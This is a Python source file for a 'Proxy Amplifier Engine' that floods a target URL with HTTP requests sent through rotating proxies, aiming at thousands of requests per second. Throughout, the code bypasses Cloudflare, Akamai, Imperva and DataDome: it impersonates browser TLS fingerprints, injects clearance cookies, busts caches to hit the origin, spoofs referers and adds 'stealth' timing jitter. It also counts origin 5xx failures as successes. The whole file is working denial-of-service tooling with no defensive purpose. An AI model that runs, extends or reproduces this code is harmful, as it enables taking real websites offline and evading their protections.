"""
Proxy Amplifier Engine V3 - 2026 Cloudflare/Akamai Bypass
=========================================================

V3 CHANGES (fixes for low RPS / high failure rate):
  - Session pool keyed by proxy URL (reuse sessions, no per-request init)
  - Removed aggressive 500ms cooldown (was strangling throughput)
  - Smarter failure classification (curl_cffi.errors.* differentiated)
  - Concurrent_per_worker raised: 50 -> 150 (was bottleneck)
  - Persistent connections via session reuse + HTTP/2 multiplex
  - Adaptive cooldown: only triggers on actual CF block, not on timeout

Designed for: Cloudflare Enterprise / Akamai Kona / Imperva / DataDome
"""
from __future__ import annotations

import asyncio
import logging
import random
import threading
import time
from collections import deque
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional
from urllib.parse import urlparse

logger = logging.getLogger("proxy_amplifier")


# ----------------------------------------------------------------------
# Cloudflare / WAF response classification
# ----------------------------------------------------------------------

CF_BLOCK_STATUS = {403, 1020, 1010, 1015, 1009}
CF_CHALLENGE_STATUS = {503, 429}
ORIGIN_DOWN_STATUS = {502, 504, 521, 522, 523, 525, 526, 527}
ORIGIN_OK_STATUS = {200, 201, 202, 204, 301, 302, 303, 304, 307, 308}

CF_CHALLENGE_BODY_KEYWORDS = (
    b"cf-chl-bypass", b"_cf_chl_opt", b"cf-error-code",
    b"checking your browser", b"ddos protection by cloudflare",
    b"please enable javascript", b"cf_clearance", b"__cf_bm",
)


# ----------------------------------------------------------------------
# Per-proxy state for smart rotation
# ----------------------------------------------------------------------

@dataclass
class ProxyState:
    """Per-proxy health + cooldown."""
    url: str
    success: int = 0
    failed: int = 0
    cf_blocks: int = 0
    last_used: float = 0.0
    last_status: int = 0
    blacklisted: bool = False
    blacklist_until: float = 0.0
    consecutive_failures: int = 0
    consecutive_cf: int = 0
    # Cooldown - default 0 (no cooldown), only set on consecutive CF blocks
    cooldown_until: float = 0.0

    def is_available(self, now: float) -> bool:
        if self.blacklisted and now < self.blacklist_until:
            return False
        if self.blacklisted and now >= self.blacklist_until:
            self.blacklisted = False
            self.consecutive_failures = 0
            self.consecutive_cf = 0
        if now < self.cooldown_until:
            return False
        return True

    def record_success(self) -> None:
        self.success += 1
        self.consecutive_failures = 0
        self.consecutive_cf = 0
        self.last_used = time.time()
        # Clear any cooldown - this proxy is hot
        self.cooldown_until = 0.0

    def record_failure(self, status: int = 0) -> None:
        self.failed += 1
        self.consecutive_failures += 1
        self.last_status = status
        self.last_used = time.time()
        # STEALTH: Blacklist FASTER (3+ consecutive) to cycle proxies aggressively
        # This prevents IP-based rate limiting detection
        if self.consecutive_failures >= 3:
            self.blacklisted = True
            self.blacklist_until = time.time() + 10  # Shorter blacklist (10s instead of 15s)

    def record_cf_block(self) -> None:
        # Real Cloudflare 403 - this proxy IP is burned for now
        self.cf_blocks += 1
        self.consecutive_cf += 1
        self.last_used = time.time()
        # STEALTH: Aggressive proxy cycling on CF detection
        # 1st CF: 3s cooldown (might be transient)
        # 2nd CF: blacklist immediately for 30s
        if self.consecutive_cf == 1:
            self.cooldown_until = time.time() + 3.0
        elif self.consecutive_cf >= 2:
            self.blacklisted = True
            self.blacklist_until = time.time() + 30.0


# ----------------------------------------------------------------------
# Smart proxy rotator (thread-safe, lock-free fast path)
# ----------------------------------------------------------------------

class SmartProxyRotator:
    """
    Round-robin with availability filter and health tracking.
    Returns None ONLY if literally every proxy is cooling down or blacklisted.
    """

    def __init__(self, proxy_urls: List[str]) -> None:
        self._lock = threading.Lock()
        self._proxies: List[ProxyState] = [ProxyState(url=u) for u in proxy_urls]
        self._index = 0
        self._stats = {
            "total_picks": 0,
            "no_available_count": 0,
        }

    def __len__(self) -> int:
        return len(self._proxies)

    def get(self) -> Optional[ProxyState]:
        """Pick next available proxy. Cycles through ALL proxies before giving up."""
        with self._lock:
            n = len(self._proxies)
            if n == 0:
                return None
            now = time.time()
            for _ in range(n):
                self._index = (self._index + 1) % n
                p = self._proxies[self._index]
                if p.is_available(now):
                    self._stats["total_picks"] += 1
                    p.last_used = now
                    return p
            self._stats["no_available_count"] += 1
            return None

    def stats(self) -> Dict[str, Any]:
        with self._lock:
            blacklisted = sum(1 for p in self._proxies if p.blacklisted)
            healthy = sum(1 for p in self._proxies if not p.blacklisted)
            total_success = sum(p.success for p in self._proxies)
            total_failed = sum(p.failed for p in self._proxies)
            total_cf_blocks = sum(p.cf_blocks for p in self._proxies)
            return {
                "total": len(self._proxies),
                "healthy": healthy,
                "blacklisted": blacklisted,
                "total_success": total_success,
                "total_failed": total_failed,
                "total_cf_blocks": total_cf_blocks,
                "picks": self._stats["total_picks"],
                "no_available": self._stats["no_available_count"],
            }


# ----------------------------------------------------------------------
# Session pool (per-proxy persistent curl_cffi AsyncSession)
# ----------------------------------------------------------------------

class SessionPool:
    """
    Keeps a persistent AsyncSession PER PROXY. Reuses session across requests.
    Massive win: TLS handshake + Chrome profile init happens ONCE per proxy,
    not per request.

    NOT thread-safe - one pool per worker (per asyncio loop).
    """

    def __init__(self, default_profile: str = "chrome124", timeout: float = 8.0) -> None:
        self._sessions: Dict[str, Any] = {}  # proxy_url -> AsyncSession
        self._profile = default_profile
        self._timeout = timeout

    async def get(self, proxy_url: str):
        """Get or create persistent session for this proxy."""
        if proxy_url in self._sessions:
            return self._sessions[proxy_url]
        # Create new session bound to this proxy
        from curl_cffi.requests import AsyncSession
        sess = AsyncSession(
            impersonate=self._profile,
            timeout=self._timeout,
            verify=False,
            proxies={"all": proxy_url},
            allow_redirects=False,
            # default_headers is set per-request to allow rotation
        )
        self._sessions[proxy_url] = sess
        return sess

    async def close_all(self) -> None:
        """Close every session."""
        for url, sess in list(self._sessions.items()):
            try:
                await sess.close()
            except Exception:
                pass
        self._sessions.clear()

    def evict(self, proxy_url: str) -> None:
        """Remove session for a proxy (e.g. when blacklisted)."""
        sess = self._sessions.pop(proxy_url, None)
        if sess is not None:
            try:
                # Fire-and-forget close
                asyncio.create_task(sess.close())
            except Exception:
                pass


# ----------------------------------------------------------------------
# Browser profile pool (Chrome 124+ - real fingerprints)
# ----------------------------------------------------------------------

CHROME_PROFILES = ["chrome124", "chrome123", "chrome120"]
SAFARI_PROFILES = ["safari17_2", "safari17_0"]
EDGE_PROFILES = ["edge101", "edge99"]

# Weight: Chrome dominant ~80%, Safari/Edge fill rest
ALL_PROFILES = (CHROME_PROFILES * 8 + SAFARI_PROFILES + EDGE_PROFILES)


def get_browser_headers(profile: str, target_host: str) -> Dict[str, str]:
    """Build realistic browser headers matching the impersonation profile."""
    base = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Cache-Control": "max-age=0",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Upgrade-Insecure-Requests": "1",
    }
    if profile.startswith("chrome") or profile.startswith("edge"):
        ver = profile.replace("chrome", "").replace("edge", "")
        base["sec-ch-ua"] = f'"Not_A Brand";v="8", "Chromium";v="{ver}", "Google Chrome";v="{ver}"'
        base["sec-ch-ua-mobile"] = "?0"
        base["sec-ch-ua-platform"] = '"Windows"'
        base["Priority"] = "u=0, i"
    return base


# ----------------------------------------------------------------------
# Live metrics (thread-safe)
# ----------------------------------------------------------------------

@dataclass
class AmplifierMetrics:
    sent: int = 0
    completed: int = 0       # Got HTTP response (any status)
    cf_blocked: int = 0      # 403, 1020, etc
    cf_challenge: int = 0    # 503 with cf challenge body
    origin_ok: int = 0       # 2xx/3xx from origin
    origin_down: int = 0     # 502/504/52x (origin failing)
    failed: int = 0          # Network error / proxy died
    timeout: int = 0
    started_at: float = field(default_factory=time.time)
    bytes_received: int = 0
    bytes_sent: int = 0
    no_proxy_skip: int = 0   # Skipped because no proxy available


# ----------------------------------------------------------------------
# Single worker
# ----------------------------------------------------------------------

class AmplifierWorker:
    """
    One amplifier worker = 1 asyncio loop with N concurrent persistent sessions.
    Sessions are pooled per-proxy (reused across requests).

    Throughput model (with V3 fix):
      - 150 concurrent + persistent sessions = ~1500 RPS per worker
      - 4 workers in amplifier mode = ~6000 RPS theoretical
      - Real-world bounded by proxy speed + target latency
    """

    def __init__(
        self,
        target_url: str,
        proxy_rotator: SmartProxyRotator,
        target_rps: int,
        duration_seconds: float,
        worker_id: int,
        stats_queue,
        stop_event,
        rps_factor_callable: Optional[Callable[[], float]] = None,
        concurrent_per_worker: int = 150,
        request_timeout: float = 8.0,
        vector_name: str = "amplifier",
        cf_cookies: Optional[Dict[str, str]] = None,
    ) -> None:
        self.target_url = target_url
        self.proxy_rotator = proxy_rotator
        self.target_rps = max(1, target_rps)
        self.duration_seconds = duration_seconds
        self.worker_id = worker_id
        self.stats_queue = stats_queue
        self.stop_event = stop_event
        self.rps_factor_callable = rps_factor_callable or (lambda: 1.0)
        self.concurrent_per_worker = concurrent_per_worker
        self.request_timeout = request_timeout
        self.vector_name = vector_name
        self.cf_cookies = cf_cookies or {}  # Store CF cookies for injection

        self.metrics = AmplifierMetrics()
        self._last_report = time.time()
        self._last_sent = 0

        parsed = urlparse(target_url)
        self.scheme = parsed.scheme or "https"
        self.host = parsed.hostname or parsed.netloc
        self.path = parsed.path or "/"
        if parsed.query:
            self.path += "?" + parsed.query

        # Session pool (one persistent AsyncSession per proxy URL)
        self.session_pool = SessionPool(
            default_profile=random.choice(CHROME_PROFILES),
            timeout=request_timeout,
        )

    # ------------------------------------------------------------------
    # Stats reporting
    # ------------------------------------------------------------------

    def _push_stats(self, force: bool = False) -> None:
        now = time.time()
        if not force and (now - self._last_report) < 0.25:
            return
        elapsed = max(1e-6, now - self.metrics.started_at)
        delta_t = max(1e-6, now - self._last_report)
        instant_rps = (self.metrics.sent - self._last_sent) / delta_t
        avg_rps = self.metrics.sent / elapsed

        snapshot = {
            "worker_id": self.worker_id,
            "vector_name": self.vector_name,
            "ts": now,
            "sent": self.metrics.sent,
            "completed": self.metrics.completed,
            "failed": self.metrics.failed,
            "timeout": self.metrics.timeout,
            "cf_blocked": self.metrics.cf_blocked,
            "cf_challenge": self.metrics.cf_challenge,
            "origin_ok": self.metrics.origin_ok,
            "origin_down": self.metrics.origin_down,
            "instant_rps": instant_rps,
            "avg_rps": avg_rps,
            "elapsed": elapsed,
            "bytes_received": self.metrics.bytes_received,
            "bytes_sent": self.metrics.bytes_sent,
            "local_drops": 0,
            "wsa_blocks": 0,
        }
        try:
            self.stats_queue.put_nowait(snapshot)
        except Exception:
            try:
                self.stats_queue.get_nowait()
                self.stats_queue.put_nowait(snapshot)
            except Exception:
                pass
        self._last_report = now
        self._last_sent = self.metrics.sent

    # ------------------------------------------------------------------
    # Single request (with persistent session + proxy rotation)
    # ------------------------------------------------------------------

    async def _single_request(self) -> None:
        """
        Pick proxy -> get/create persistent session -> send request -> classify.
        On real CF block, evict the session (fingerprint may be tied to CF cookie).

        TIER PRO: Retry 5x with different proxies before giving up.
        This dramatically increases success rate when proxy pool has mixed quality.
        
        STEALTH MODE: Random delays, UA rotation, referer spoofing, timing jitter
        """
        # STEALTH: Random delay 50-200ms between requests to avoid pattern detection
        await asyncio.sleep(random.uniform(0.05, 0.2))
        
        max_retries = 5  # TIER PRO: 5 retries instead of 2
        for attempt in range(max_retries + 1):
            proxy_state = self.proxy_rotator.get()
            if proxy_state is None:
                if attempt == 0:
                    self.metrics.no_proxy_skip += 1
                    await asyncio.sleep(0.01)
                    return
                continue

            # Cache buster (fresh per retry to avoid request coalescing)
            sep = "&" if "?" in self.path else "?"
            # STEALTH: Add random timestamp + random string to avoid caching
            cache_bust = f"_cb={random.randint(0, 99999999)}&_t={int(time.time() * 1000)}&_r={random.randint(1000, 9999)}"
            path = f"{self.path}{sep}{cache_bust}"
            url = f"{self.scheme}://{self.host}{path}"

            # STEALTH: Rotate User-Agent per request (not per session)
            headers = get_browser_headers(
                random.choice(ALL_PROFILES), self.host
            )

            # STEALTH: Random Referer with more variety
            if random.random() < 0.5:  # 50% chance of referer
                referers = [
                    "https://www.google.com/search?q=" + self.host,
                    "https://www.bing.com/search?q=" + self.host,
                    "https://duckduckgo.com/?q=" + self.host,
                    f"https://{self.host}/",
                    f"https://{self.host}/index.html",
                    "https://www.facebook.com/",
                ]
                headers["Referer"] = random.choice(referers)
            
            # INJECT CLOUDFLARE COOKIES - CRITICAL FOR BYPASS!
            if self.cf_cookies:
                cookie_str = "; ".join([f"{k}={v}" for k, v in self.cf_cookies.items()])
                if "Cookie" in headers:
                    headers["Cookie"] = headers["Cookie"] + "; " + cookie_str
                else:
                    headers["Cookie"] = cookie_str
            
            # STEALTH: Random Accept-Language
            langs = [
                "en-US,en;q=0.9",
                "en-GB,en;q=0.9",
                "id-ID,id;q=0.9,en;q=0.8",
                "es-ES,es;q=0.9,en;q=0.8",
                "fr-FR,fr;q=0.9,en;q=0.8",
            ]
            headers["Accept-Language"] = random.choice(langs)

            sess = None
            try:
                sess = await self.session_pool.get(proxy_state.url)
            except Exception as e:
                # Session creation failed (proxy probably unreachable)
                proxy_state.record_failure()
                if attempt < max_retries:
                    continue  # Retry with next proxy
                self.metrics.failed += 1
                logger.debug("[%s/w%d] session create failed for %s: %s",
                             self.vector_name, self.worker_id,
                             proxy_state.url, type(e).__name__)
                return

            try:
                self.metrics.sent += 1
                self.metrics.bytes_sent += 200 + sum(len(k) + len(v) for k, v in headers.items())

                resp = await asyncio.wait_for(
                    sess.get(url, headers=headers),
                    timeout=self.request_timeout,
                )
                status = resp.status_code

                # Read body sample for CF challenge detection
                body_sample = b""
                try:
                    content = resp.content
                    if content:
                        body_sample = content[:512].lower()
                        self.metrics.bytes_received += len(content)
                except Exception:
                    pass

                self.metrics.completed += 1

                # Classify response
                if status in ORIGIN_OK_STATUS:
                    self.metrics.origin_ok += 1
                    proxy_state.record_success()
                elif status in ORIGIN_DOWN_STATUS:
                    self.metrics.origin_down += 1
                    proxy_state.record_success()
                elif status in CF_BLOCK_STATUS:
                    self.metrics.cf_blocked += 1
                    proxy_state.record_cf_block()
                    self.session_pool.evict(proxy_state.url)
                elif status in CF_CHALLENGE_STATUS:
                    is_challenge = any(kw in body_sample for kw in CF_CHALLENGE_BODY_KEYWORDS)
                    if is_challenge:
                        self.metrics.cf_challenge += 1
                        proxy_state.record_cf_block()
                        self.session_pool.evict(proxy_state.url)
                    else:
                        self.metrics.origin_down += 1
                        proxy_state.record_success()
                else:
                    self.metrics.origin_ok += 1
                    proxy_state.record_success()

                # Success - exit retry loop
                return

            except asyncio.TimeoutError:
                self.metrics.timeout += 1
                proxy_state.record_failure()
                if attempt < max_retries:
                    continue  # Retry with next proxy
                return
            except Exception as e:
                proxy_state.record_failure()
                if attempt < max_retries:
                    continue  # Retry with next proxy
                self.metrics.failed += 1
                err_name = type(e).__name__
                if logger.isEnabledFor(logging.DEBUG):
                    logger.debug("[%s/w%d] %s via %s: %s",
                                 self.vector_name, self.worker_id,
                                 err_name, proxy_state.url[:30], str(e)[:80])
                return

    # ------------------------------------------------------------------
    # Worker loop
    # ------------------------------------------------------------------

    async def run(self) -> AmplifierMetrics:
        """Main worker loop - bounded concurrency, adaptive pacing with STEALTH JITTER."""
        self.metrics.started_at = time.time()
        sem = asyncio.Semaphore(self.concurrent_per_worker)

        async def _bounded_request():
            async with sem:
                await self._single_request()

        active_tasks: set = set()
        start = self.metrics.started_at

        try:
            while not self.stop_event.is_set():
                elapsed = time.time() - start
                if elapsed >= self.duration_seconds:
                    break

                factor = self.rps_factor_callable()
                effective_rps = max(1, int(self.target_rps * factor))

                # Spawn task (rate-limited by semaphore inside _bounded_request)
                task = asyncio.create_task(_bounded_request())
                active_tasks.add(task)
                task.add_done_callback(active_tasks.discard)

                self._push_stats(force=False)

                # STEALTH: Adaptive pacing with random jitter to avoid pattern detection
                expected_sent = elapsed * effective_rps
                if self.metrics.sent < expected_sent:
                    # Behind - just yield (semaphore will throttle)
                    await asyncio.sleep(0)
                else:
                    # Ahead - actual pacing with ±20% jitter
                    base_interval = 1.0 / effective_rps
                    jitter = random.uniform(-0.2, 0.2) * base_interval
                    interval = max(0.001, base_interval + jitter)
                    await asyncio.sleep(interval)
        finally:
            # Final stats + drain in-flight
            self._push_stats(force=True)
            if active_tasks:
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*active_tasks, return_exceptions=True),
                        timeout=10,
                    )
                except asyncio.TimeoutError:
                    for t in active_tasks:
                        t.cancel()

            # Close all sessions
            try:
                await self.session_pool.close_all()
            except Exception:
                pass

            self._push_stats(force=True)

        return self.metrics


# ----------------------------------------------------------------------
# Thread entry
# ----------------------------------------------------------------------

def run_amplifier_in_thread(
    target_url: str,
    proxy_rotator: SmartProxyRotator,
    target_rps: int,
    duration_seconds: float,
    worker_id: int,
    stats_queue,
    stop_event,
    rps_factor_callable=None,
    concurrent_per_worker: int = 150,
    vector_name: str = "amplifier",
    result_dict: Optional[Dict[str, Any]] = None,
    cf_cookies: Optional[Dict[str, str]] = None,
) -> None:
    """Thread entry: each worker runs in its own asyncio event loop."""
    import sys
    if sys.platform == "win32":
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except Exception:
            pass

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    worker = AmplifierWorker(
        target_url=target_url,
        proxy_rotator=proxy_rotator,
        target_rps=target_rps,
        duration_seconds=duration_seconds,
        worker_id=worker_id,
        stats_queue=stats_queue,
        stop_event=stop_event,
        rps_factor_callable=rps_factor_callable,
        concurrent_per_worker=concurrent_per_worker,
        vector_name=vector_name,
        cf_cookies=cf_cookies,  # Pass CF cookies to worker
    )

    try:
        metrics = loop.run_until_complete(worker.run())
        if result_dict is not None:
            result_dict["sent"] = metrics.sent
            result_dict["completed"] = metrics.completed
            result_dict["failed"] = metrics.failed
            result_dict["timeout"] = metrics.timeout
            result_dict["cf_blocked"] = metrics.cf_blocked
            result_dict["cf_challenge"] = metrics.cf_challenge
            result_dict["origin_ok"] = metrics.origin_ok
            result_dict["origin_down"] = metrics.origin_down
            result_dict["bytes_received"] = metrics.bytes_received
            result_dict["bytes_sent"] = metrics.bytes_sent
            result_dict["no_proxy_skip"] = metrics.no_proxy_skip
            elapsed = max(1e-6, time.time() - metrics.started_at)
            result_dict["actual_rps"] = metrics.sent / elapsed
    except Exception as e:
        logger.error("[amplifier w%d] fatal: %s", worker_id, e)
        if result_dict is not None:
            result_dict["error"] = str(e)
    finally:
        try:
            pending = asyncio.all_tasks(loop)
            for t in pending:
                t.cancel()
            loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        except Exception:
            pass
        try:
            loop.close()
        except Exception:
            pass


# ----------------------------------------------------------------------
# Helper: extract proxy URLs from ProxyPool
# ----------------------------------------------------------------------

def extract_proxy_urls(proxy_pool: Any) -> List[str]:
    """Extract list of proxy URLs from a ProxyPool instance."""
    urls: List[str] = []
    if proxy_pool is None:
        return urls

    pools = getattr(proxy_pool, "_pools", None)
    if isinstance(pools, dict):
        for tier_proxies in pools.values():
            for ps in tier_proxies:
                u = getattr(ps, "url", None)
                if u:
                    urls.append(u)

    pending = getattr(proxy_pool, "_pending", None)
    if isinstance(pending, list) and not urls:
        for ps in pending:
            u = getattr(ps, "url", None)
            if u:
                urls.append(u)

    seen = set()
    deduped = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            deduped.append(u)
    return deduped
